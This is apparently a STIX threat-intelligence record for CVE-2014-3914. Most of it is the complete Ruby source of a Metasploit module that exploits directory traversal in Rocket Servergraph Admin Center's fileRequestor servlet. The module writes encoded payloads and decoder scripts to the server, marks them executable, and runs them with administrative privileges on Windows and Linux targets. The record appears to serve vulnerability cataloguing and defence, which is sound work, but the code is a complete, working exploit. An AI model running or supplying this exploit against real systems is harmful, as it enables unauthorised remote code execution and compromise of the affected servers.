{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3df385b-e4b2-4750-8ee6-4285a2ec9091",
    "created": "2024-08-14T17:09:07.195704Z",
    "modified": "2024-08-14T17:09:07.195708Z",
    "name": "Rocket Servergraph Admin Center fileRequestor Remote Code Execution",
    "description": " This module abuses several directory traversal flaws in Rocket Servergraph Admin Center for Tivoli Storage Manager. The issues exist in the fileRequestor servlet allowing a remote attacker to write arbitrary files and execute commands with administrative privileges. This module has been tested successfully on Rocket ServerGraph 1.2 over Windows 2008 R2 64 bits, Windows 7 SP1 32 bits and Ubuntu 12.04 64 bits. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/rocket_servergraph_file_requestor_rce.rb",
            "external_id": "rocket_servergraph_file_requestor_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3914"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Rocket Servergraph Admin Center fileRequestor Remote Code Execution',\n      'Description' => %q{\n        This module abuses several directory traversal flaws in Rocket Servergraph Admin\n        Center for Tivoli Storage Manager. The issues exist in the fileRequestor servlet,\n        allowing a remote attacker to write arbitrary files and execute commands with\n        administrative privileges. This module has been tested successfully on Rocket\n        ServerGraph 1.2 over Windows 2008 R2 64 bits, Windows 7 SP1 32 bits and Ubuntu\n        12.04 64 bits.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2014-3914'],\n          ['ZDI', '14-161'],\n          ['ZDI', '14-162'],\n          ['BID', '67779']\n        ],\n      'Privileged'  => true,\n      'Platform'    => %w{ linux unix win },\n      'Arch'        => [ARCH_X86, ARCH_X64, ARCH_CMD],\n      'Payload'     =>\n        {\n          'Space'       => 8192, # it's writing a file, so just a long enough value\n          'DisableNops' => true\n          #'BadChars'   => (0x80..0xff).to_a.pack(\"C*\") # Doesn't apply\n        },\n      'Targets'     =>\n        [\n          [ 'Linux (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Linux (CMD Payload)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD\n            }\n          ],\n          [ 'Windows / VB Script',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Windows CMD',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-10-30'))\n\n    register_options(\n      [\n        Opt::RPORT(8888)\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('TRAVERSAL_DEPTH', [ true, 'Traversal depth to hit the root folder', 20]),\n        OptString.new(\"WINDIR\", [ true, 'The Windows Directory name', 'WINDOWS' ]),\n        OptString.new(\"TEMP_DIR\", [ false, 'A directory where we can write files' ])\n      ])\n\n  end\n\n  def check\n    os = get_os\n\n    if os.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    os = get_os\n\n    if os == 'win' && target.name =~ /Linux/\n      fail_with(Failure::BadConfig, \"#{peer} - Windows system detected, but Linux target selected\")\n    elsif os == 'linux' && target.name =~ /Windows/\n      fail_with(Failure::BadConfig, \"#{peer} - Linux system detected, but Windows target selected\")\n    elsif os.nil?\n      print_warning(\"Failed to detect remote operating system, trying anyway...\")\n    end\n\n    if target.name =~ /Windows.*VB/\n      exploit_windows_vbs\n    elsif target.name =~ /Windows.*CMD/\n      exploit_windows_cmd\n    elsif target.name =~ /Linux.*CMD/\n      exploit_linux_cmd\n    elsif target.name =~ /Linux.*Native/\n      exploit_linux_native\n    end\n  end\n\n  def exploit_windows_vbs\n    traversal = \"\\\\..\" * traversal_depth\n    payload_base64 = Rex::Text.encode_base64(generate_payload_exe)\n    temp = temp_dir('win')\n    decoder_file_name = \"#{rand_text_alpha(4 + rand(3))}.vbs\"\n    encoded_file_name = \"#{rand_text_alpha(4 + rand(3))}.b64\"\n    exe_file_name = \"#{rand_text_alpha(4 + rand(3))}.exe\"\n\n    print_status(\"Dropping the encoded payload to filesystem...\")\n    write_file(\"#{traversal}#{temp}#{encoded_file_name}\", payload_base64)\n\n    vbs = generate_decoder_vbs({\n      :temp_dir => \"C:#{temp}\",\n      :encoded_file_name => encoded_file_name,\n      :exe_file_name => exe_file_name\n    })\n    print_status(\"Dropping the VBS decoder to filesystem...\")\n    write_file(\"#{traversal}#{temp}#{decoder_file_name}\", vbs)\n\n    register_files_for_cleanup(\"C:#{temp}#{decoder_file_name}\")\n    register_files_for_cleanup(\"C:#{temp}#{encoded_file_name}\")\n    register_files_for_cleanup(\"C:#{temp}#{exe_file_name}\")\n    print_status(\"Executing payload...\")\n    execute(\"#{traversal}\\\\#{win_dir}\\\\System32\\\\cscript //nologo C:#{temp}#{decoder_file_name}\")\n  end\n\n\n  def exploit_windows_cmd\n    traversal = \"\\\\..\" * traversal_depth\n    execute(\"#{traversal}\\\\#{win_dir}\\\\System32\\\\cmd.exe /B /C #{payload.encoded}\")\n  end\n\n  def exploit_linux_native\n    traversal = \"/..\" * traversal_depth\n    payload_base64 = Rex::Text.encode_base64(generate_payload_exe)\n    temp = temp_dir('linux')\n    encoded_file_name = \"#{rand_text_alpha(4 + rand(3))}.b64\"\n    decoder_file_name = \"#{rand_text_alpha(4 + rand(3))}.sh\"\n    elf_file_name = \"#{rand_text_alpha(4 + rand(3))}.elf\"\n\n    print_status(\"Dropping the encoded payload to filesystem...\")\n    write_file(\"#{traversal}#{temp}#{encoded_file_name}\", payload_base64)\n\n    decoder = <<-SH\n#!/bin/sh\n\nbase64 --decode #{temp}#{encoded_file_name} > #{temp}#{elf_file_name}\nchmod 777 #{temp}#{elf_file_name}\n#{temp}#{elf_file_name}\nSH\n\n    print_status(\"Dropping the decoder to filesystem...\")\n    write_file(\"#{traversal}#{temp}#{decoder_file_name}\", decoder)\n\n    register_files_for_cleanup(\"#{temp}#{decoder_file_name}\")\n    register_files_for_cleanup(\"#{temp}#{encoded_file_name}\")\n    register_files_for_cleanup(\"#{temp}#{elf_file_name}\")\n\n    print_status(\"Giving execution permissions to the decoder...\")\n    execute(\"#{traversal}/bin/chmod 777 #{temp}#{decoder_file_name}\")\n\n    print_status(\"Executing decoder and payload...\")\n    execute(\"#{traversal}/bin/sh #{temp}#{decoder_file_name}\")\n  end\n\n  def exploit_linux_cmd\n    temp = temp_dir('linux')\n    elf = rand_text_alpha(4 + rand(4))\n\n    traversal = \"/..\" * traversal_depth\n    print_status(\"Dropping payload...\")\n    write_file(\"#{traversal}#{temp}#{elf}\", payload.encoded)\n    register_files_for_cleanup(\"#{temp}#{elf}\")\n    print_status(\"Providing execution permissions...\")\n    execute(\"#{traversal}/bin/chmod 777 #{temp}#{elf}\")\n    print_status(\"Executing payload...\")\n    execute(\"#{traversal}#{temp}#{elf}\")\n  end\n\n  def generate_decoder_vbs(opts = {})\n    decoder_path = File.join(Rex::Exploitation::DATA_DIR, \"exploits\", \"cmdstager\", \"vbs_b64\")\n\n    f = File.new(decoder_path, \"rb\")\n    decoder = f.read(f.stat.size)\n    f.close\n\n    decoder.gsub!(/>>decode_stub/, \"\")\n    decoder.gsub!(/^echo /, \"\")\n    decoder.gsub!(/ENCODED/, \"#{opts[:temp_dir]}#{opts[:encoded_file_name]}\")\n    decoder.gsub!(/DECODED/, \"#{opts[:temp_dir]}#{opts[:exe_file_name]}\")\n\n    decoder\n  end\n\n  def get_os\n    os = nil\n    path = \"\"\n    hint = rand_text_alpha(3 + rand(4))\n\n    res = send_request(20, \"writeDataFile\", rand_text_alpha(4 + rand(10)), \"/#{hint}/#{hint}\")\n\n    if res && res.code == 200 && res.body =~ /java.io.FileNotFoundException: (.*)\\/#{hint}\\/#{hint} \\(No such file or directory\\)/\n      path = $1\n    elsif res && res.code == 200 && res.body =~ /java.io.FileNotFoundException: (.*)\\\\#{hint}\\\\#{hint} \\(The system cannot find the path specified\\)/\n      path = $1\n    end\n\n    if path =~ /^\\//\n      os = 'linux'\n    elsif path =~ /^[a-zA-Z]:\\\\/\n      os = 'win'\n    end\n\n    os\n  end\n\n  def temp_dir(os)\n    temp = \"\"\n    case os\n    when 'linux'\n      temp = linux_temp_dir\n    when 'win'\n      temp = win_temp_dir\n    end\n\n    temp\n  end\n\n  def linux_temp_dir\n    dir = \"/tmp/\"\n\n    if datastore['TEMP_DIR'] && !datastore['TEMP_DIR'].empty?\n      dir = datastore['TEMP_DIR']\n    end\n\n    unless dir.start_with?(\"/\")\n      dir = \"/#{dir}\"\n    end\n\n    unless dir.end_with?(\"/\")\n      dir = \"#{dir}/\"\n    end\n\n    dir\n  end\n\n  def win_temp_dir\n    dir = \"\\\\#{win_dir}\\\\Temp\\\\\"\n\n    if datastore['TEMP_DIR'] && !datastore['TEMP_DIR'].empty?\n      dir = datastore['TEMP_DIR']\n    end\n\n    dir.gsub!(/\\//, \"\\\\\")\n    dir.gsub!(/^([A-Za-z]:)?/, \"\")\n\n    unless dir.start_with?(\"\\\\\")\n      dir = \"\\\\#{dir}\"\n    end\n\n    unless dir.end_with?(\"\\\\\")\n      dir = \"#{dir}\\\\\"\n    end\n\n    dir\n  end\n\n  def win_dir\n    dir = \"WINDOWS\"\n    if datastore['WINDIR']\n      dir = datastore['WINDIR']\n      dir.gsub!(/\\//, \"\\\\\")\n      dir.gsub!(/[\\\\]*$/, \"\")\n      dir.gsub!(/^([A-Za-z]:)?[\\\\]*/, \"\")\n    end\n\n    dir\n  end\n\n  def traversal_depth\n    depth = 20\n\n    if datastore['TRAVERSAL_DEPTH'] && datastore['TRAVERSAL_DEPTH'] > 1\n      depth = datastore['TRAVERSAL_DEPTH']\n    end\n\n    depth\n  end\n\n  def write_file(file_name, contents)\n    res = send_request(20, \"writeDataFile\", Rex::Text.uri_encode(contents), file_name)\n\n    unless res && res.code == 200 && res.body.to_s =~ /Data successfully writen to file: /\n      fail_with(Failure::Unknown, \"#{peer} - Failed to write file... aborting\")\n    end\n\n    res\n  end\n\n  def execute(command)\n    res = send_request(1, \"run\", command)\n\n    res\n  end\n\n  def send_request(timeout, command, query, source = rand_text_alpha(rand(4) + 4))\n    data = \"&invoker=#{rand_text_alpha(rand(4) + 4)}\"\n    data << \"&title=#{rand_text_alpha(rand(4) + 4)}\"\n    data << \"&params=#{rand_text_alpha(rand(4) + 4)}\"\n    data << \"&id=#{rand_text_alpha(rand(4) + 4)}\"\n    data << \"&cmd=#{command}\"\n    data << \"&source=#{source}\"\n    data << \"&query=#{query}\"\n\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri('/', 'SGPAdmin', 'fileRequest'),\n        'method' => 'POST',\n        'data'   => data\n      }, timeout)\n\n    res\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "win'"
    ]
}